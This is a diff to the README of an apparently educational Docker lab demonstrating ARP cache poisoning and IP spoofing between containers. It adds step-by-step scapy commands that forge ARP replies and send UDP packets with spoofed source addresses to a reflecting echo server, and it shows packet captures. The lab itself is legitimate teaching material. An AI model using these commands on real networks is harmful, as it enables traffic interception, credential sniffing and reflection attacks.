@@ -1,6 +1,11 @@
-# ARP Cache Poisoning Lab
+# ARP Cache Poisoning & IP Spoofing Lab
 
-This repository contains a minimal lab setup for demoing ARP cache poisoning.
+This repository contains a minimal lab setup for demoing ARP cache poisoning and IP spoofing.
+
+ - [Wikipedia: Arp Spoofing](https://en.wikipedia.org/wiki/ARP_spoofing)
+ - [Wikipedia: IP Spoofing](https://en.wikipedia.org/wiki/IP_address_spoofing)
+
+> This lab setup is only for demo'ing purposes and MUST NOT be used in production!
 
 > The code contained in this repository is intentionally INSECURE and must NOT be used in production!
 
@@ -10,10 +15,11 @@ This repository contains a minimal lab setup for demoing ARP cache poisoning.
 - Clone this repo
 - Run `docker-compose build`
 
-You get two images for
+You get three images for
 
 - victim
 - attacker
+- udpserver
 
 that are used by the containers described in the next section.
 
@@ -21,37 +27,47 @@ After the images are built, run the containers via the command:
 
 ```bash
 $ docker-compose up -d
-[+] Running 0/3
- ⠋ Container alice  Creating
- ⠋ Container evie   Creating
- ⠋ Container bob    Creating
+[+] Running 0/4
+ ⠋ Container alice    Creating
+ ⠋ Container evie     Creating
+ ⠋ Container bob      Creating
+ ⠋ Container udpserv  Creating
  ...
 ```
 
 For accessing the containers, refer to the section at the end of this document.
 
 If you need to explicitly rebuild the images use `docker-compose up -d --build`.
+
 ## Configuration
 
 There are three containers based on two images
 
-| Name    | IP address  | MAC address       | Role     |
-| ------- | ----------- | ----------------- | -------- |
-| `alice` | 10.10.0.101 | 00:00:00:00:00:01 | Victim   |
-| `bob`   | 10.10.0.102 | 00:00:00:00:00:02 | Victim   |
-| `evie`  | 10.10.0.103 | 00:00:00:00:00:03 | Attacker |
+| Name      | IP address  | MAC address       | Role            | Service         |
+| --------- | ----------- | ----------------- | --------------- | --------------- |
+| `alice`   | 10.10.0.101 | 00:00:00:00:00:01 | Victim          | 80/tcp (http)   |
+| `bob`     | 10.10.0.102 | 00:00:00:00:00:02 | Victim          | 80/tcp (http)   |
+| `evie`    | 10.10.0.103 | 00:00:00:00:00:03 | Attacker        | -               |
+| `udpserv` | 10.10.0.104 | 00:00:00:00:00:04 | UDP Echo Server | 9999/udp (echo) |
+
 
 ## Manual ARP Cache Poisoning
 
-Tell `alice` that the ip address of `bob` resides at `evies` mac address.
+Tell `alice` that the ip address of `bob` resides at `evie's` mac address.
 
-```bash
+```python
 $ scapy
 ...
->>> a = ARP()
->>> a.show()
->>> a.pdst('10.10.0.101')
->>> a.psrc('10.10.0.102')
+>>> a = ARP()                      # create an ARP packet
+>>> a.show()                       # have a look at the ARP packet
+>>> a.op = 'is-at'                 # Unsolicited ARP
+>>> a.pdst = '10.10.0.101'         # Alice's IP
+>>> a.psrc = '10.10.0.102'         # Bob's IP
+>>> a.hwdst = '00:00:00:00:00:01'  # Alice's MAC
+>>> a.hwsrc = '00:00:00:00:00:03'  # Evie's MAC
+>>> a.show()                       # check the values again
+>>> send(a)                        # send the Packet (on L3, for convenience)
+>>> ...
 ```
 
 During the attack, monitor the system's ARP cache for changes via
@@ -64,9 +80,10 @@ Every 1.0s: ip neigh show
 ...
 ```
 
+If the attack was successful you should be able to see the MAC address of `bob's` ip changing to `evie's` MAC address.
+
 > `watch` executes the command `ip neigh show` (show ARP cache) every second (`-n1`) and highlights changes (`-d`).
 
-If the attack is successful, the associated MAC address of the targeted IP address should have changed.
 
 ## Automatic ARP Cache Poisoning
 
@@ -92,6 +109,36 @@ $ curl "http://bob/login?user=myuser&pass=mysecret"
 $ curl "http://bob/login" --data "user=myuser&pass=mysecret"
 ...
 ```
+
+## Manual IP Spoofing
+
+For the IP spoofing we use a echo server that just returns the request-data 10 times to the address contained in the IP-packet's `source` field.
+
+> To check if the UDP Echo server is running you can `nc -u 10.10.0.104 9999` from any other machine in this lab setup and send some arbitrary data. You should receive 10-times your request.
+
+On the attacker (`evie`) create a packet that is addressed to the echo server and contains e.g. `alice's` IP address in the `src`-field.
+
+```python
+$ scapy
+...
+# Create a IP/UDP/Data-Packet and send it via L3 to the Server
+>>> send(IP(dst='10.10.0.104', src='10.10.0.101')/UDP(dport=9999)/Raw(load="abc"))
+...
+```
+
+Monitor the incoming UDP data on `alice` using:
+
+```bash
+$ tcpdump -i eth0 -X udp
+...
+15:21:59.013318 IP udpserv.arplab_lab-net.9999 > alice.53: 24930 updateM+ [b2&3=0x6361] [24930a] [25187q] [25441n] [25187au] [|domain]
+	0x0000:  4500 003a 6ed3 4000 4011 b6ff 0a0a 0068  E..:n.@.@......h
+	0x0010:  0a0a 0065 270f 0035 0026 1518 6162 6361  ...e'..5.&..abca
+	0x0020:  6263 6162 6361 6263 6162 6361 6263 6162  bcabcabcabcabcab
+	0x0030:  6361 6263 6162 6361 6263                 cabcabcabc
+...
+```
+
 
 ## Common docker commands
 
@@ -127,4 +174,5 @@ root@evie:/#
 ```
 
 ## License
+
 The work in this repository may be reused under the terms of [(CC BY-SA 4.0)](https://creativecommons.org/licenses/by-sa/4.0/).
